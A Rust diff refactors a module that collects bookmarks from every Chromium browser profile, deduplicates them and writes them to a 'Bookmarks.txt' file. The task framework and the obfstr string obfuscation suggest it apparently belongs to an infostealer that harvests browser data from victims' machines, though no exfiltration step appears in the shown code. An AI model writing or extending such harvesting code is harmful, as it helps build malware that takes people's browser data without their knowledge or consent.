@@ -5,7 +5,7 @@ use alloc::vec;
 use alloc::vec::Vec;
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
-use crate::Bookmark;
+use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
 use crate::chromium::Browser;
 use obfstr::obfstr as s;
 use json::{parse, Value};
@@ -24,26 +24,11 @@ impl Task for BookmarksTask {
     parent_name!("Bookmarks.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let mut bookmarks: Vec<Bookmark> = self.browser
-            .profiles
-            .iter()
-            .filter_map(|profile| read_bookmarks(profile))
-            .flat_map(|v| v.into_iter())
-            .collect();
-        
-        if bookmarks.is_empty() {
+        let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, read_bookmarks) else {
             return
-        }
+        };
         
-        bookmarks.sort();
-        bookmarks.dedup();
-
-        let _ = bookmarks
-            .iter()
-            .map(|bookmark| bookmark.to_string())
-            .collect::<Vec<String>>()
-            .join("\n\n")
-            .write_to(parent);
+        let _ = to_string_and_write_all(&bookmarks, "\n\n", parent);
     }
 }
 
